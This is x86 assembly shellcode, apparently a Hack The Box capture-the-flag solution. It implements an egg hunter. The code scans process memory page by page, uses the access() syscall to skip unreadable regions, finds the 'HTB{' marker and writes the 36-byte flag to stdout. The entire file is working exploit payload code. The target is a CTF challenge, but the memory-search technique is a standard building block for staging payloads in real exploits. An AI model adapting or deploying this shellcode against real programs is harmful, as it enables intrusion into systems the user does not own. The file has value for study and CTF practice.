global _start

section .text
_start:  
    xor eax, eax                ; clear eax
    mov al, 0x1b                ; syscall for alarm() into eax
    int 0x80                    ; call interupt

    mov ebx,0x7b425448          ; string to search for "HTB{"
    mov edx,0x5fffffff          ; search starting address
    xor ecx,ecx                 ; clear the ecx register
    mov al, 0x21                ; syscall for access()                

next_page:
    or dx, 0xfff                ; set next page to the next 0x1000

next_address:
    inc edx                     ; increment edx
    pushad                      ; push all regisers to stack
    lea ebx,[edx+0x4]           ; check if memory space is readable
    int 0x80                    ; interupt request

    cmp al,0xf2                 ; check for EFAULT
    popad                       ; restore registers
    jz next_page                ; memory not readable, jump to next_page
    
    cmp [edx], ebx              ; check if egg was found          
    jnz next_address            ; not here keep looking
    
print_flag:
    push 0x4
    pop eax                     ; set syscall for write()
    push 0x1
    pop ebx                     ; set stdout
    mov ecx,edx                 ; set ecx to pointer of string
    push 36
    pop edx                     ; write 36 bytes
    int 0x80                    ; interupt request